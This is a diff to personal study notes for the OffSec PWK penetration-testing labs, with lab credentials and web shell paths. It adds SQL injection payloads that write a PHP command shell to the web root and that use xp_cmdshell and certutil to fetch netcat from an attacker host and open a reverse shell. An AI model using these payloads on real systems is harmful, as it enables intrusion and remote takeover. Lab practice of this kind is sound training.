@@ -58,11 +58,14 @@
 - PWK Labs  
   - Credentials (🔒 username:Eric.Wallows, password:EricLikesRunning800)
   - Flag format: `OS{68c1a60008e872f3b525407de04e48a3}`
-  - Find flag: `find / -name "flag.txt" 2>/dev/null`
+  - Find flag:  
+    Linux: `find / -name "flag.txt" 2>/dev/null`  (cat flag.txt)  
+    Windows: `C:\Windows\system32> where /r C:\ flag.txt`  (type flag.txt)  
   - webshell (asp, aspx, cfm, jsp, laudanum, perl, php)
     - aspx: /usr/share/webshells/aspx/cmdasp.aspx
     - php: simple-backdoor.php (cmd)
     - php: php-reverse-shell.php (reverse web shell)
+    - nc.exe: https://github.com/int0x33/nc.exe/blob/master/nc64.exe  
 
 ## Methodology 
 
@@ -925,12 +928,23 @@
     11. `nc -nvlp 8888`
     12. Navigate to http://alvida-eatery.org/wp-admin/plugins.php → Add New → Upload Plugin and upload plug.zip > install > activate plugin
     13. netcat got response and find the flag `find / -name "flag.txt" 2>/dev/null`  
-  - **Capstone Lab**: UNION based write shells to server - INTO OUTFILE
-    Capture POST request of "subscribe" function in website
-    `sqlmap -r post.txt -p mail-list --batch --level=5 --risk=3 --dump`
-    `mail-list=hello@gmail.com' UNION SELECT null, null, null, null, "<?php system($_GET['cmd']);?>", null INTO OUTFILE '/var/www/html/shell.php' #`
-    `http://192.168.169.48/shell.php?cmd=cat%20/var/www/flag.txt`  
-  - 
+  - **Capstone Lab**: UNION based write shells to server - INTO OUTFILE  
+    1. `Capture POST request of "subscribe" function in website  
+    2. `sqlmap -r post.txt -p mail-list --batch --level=5 --risk=3 --dump`  
+    3. `mail-list=hello@gmail.com' UNION SELECT null, null, null, null, "<?php system($_GET['cmd']);?>", null INTO OUTFILE '/var/www/html/shell.php' #`  
+    4. `http://192.168.169.48/shell.php?cmd=cat%20/var/www/flag.txt`  
+  - **Capstone Lab**: TIME based xp_cmdshell mssql  
+    sql probe: `'; IF (SELECT SUBSTRING(@@version,1,1)) = 'M' WAITFOR DELAY '0:0:3'--`  
+    1. start a web server to host nc64.exe  
+       download nc64.exe from https://github.com/int0x33/nc.exe/blob/master/nc64.exe  
+       `sudo mv nc64.exe /var/www/html/`
+       `sudo python3 -m http.server 80`
+       `nc -lvnp 4444`
+    3. Inject via SQLi (download netcat)  
+       `';EXEC xp_cmdshell "certutil -urlcache -f http://192.168.45.165/nc64.exe c:/windows/temp/nc64.exe";--`  
+    5. Inject to trigger reverse shell  
+       `'; EXEC xp_cmdshell "C:\Windows\Temp\nc64.exe 192.168.45.165 4444 -e C:\Windows\System32\cmd.exe";--`
+    4. `C:\Windows\system32> where /r C:\ flag.txt`  
 
 ### Client-site attacks  
 - 12.1.1 Information Gathering
